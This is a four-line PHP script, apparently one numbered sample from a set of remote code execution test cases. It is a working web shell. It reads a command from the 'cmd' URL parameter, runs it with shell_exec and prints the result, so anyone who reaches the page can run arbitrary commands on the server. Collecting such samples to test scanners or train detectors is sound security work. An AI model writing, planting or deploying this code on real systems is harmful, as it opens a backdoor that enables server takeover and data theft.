<?php
// RCE test variation #865
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>